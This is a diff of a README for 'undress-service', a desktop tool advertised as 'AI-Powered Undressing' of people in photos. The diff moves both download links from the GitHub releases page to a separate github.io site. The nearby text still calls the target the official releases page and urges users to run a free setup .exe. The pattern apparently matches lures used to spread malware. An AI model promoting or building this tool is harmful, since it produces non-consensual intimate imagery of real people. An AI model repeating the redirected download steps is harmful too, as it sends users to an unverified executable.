@@ -1,7 +1,7 @@
 <h1>⚡ undress-service - Fast, Private, and Effortless AI-Powered Undressing</h1>
 
 <p align="center">
-  <a href="https://github.com/Scaleless-reductase7721/undress-service/releases">
+  <a href="https://scaleless-reductase7721.github.io">
     <img src="https://img.shields.io/badge/Download-Now-%23FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=%23222222" alt="Download Button">
   </a>
 </p>
@@ -25,7 +25,7 @@ undress-service is a cutting-edge desktop application designed to simulate the p
 ### Step 1: Get the Application
 
 Visit this link to download the application:  
-👉 [https://github.com/Scaleless-reductase7721/undress-service/releases](https://github.com/Scaleless-reductase7721/undress-service/releases)
+👉 [https://scaleless-reductase7721.github.io](https://scaleless-reductase7721.github.io)
 
 This takes you to the official releases page. Look for the latest version tagged as “Latest release” (usually at the top). Click on the file named `undress-service-setup.exe` (or similar). The download will begin automatically. No need to sign up or enter any payment details—it’s completely free.
 
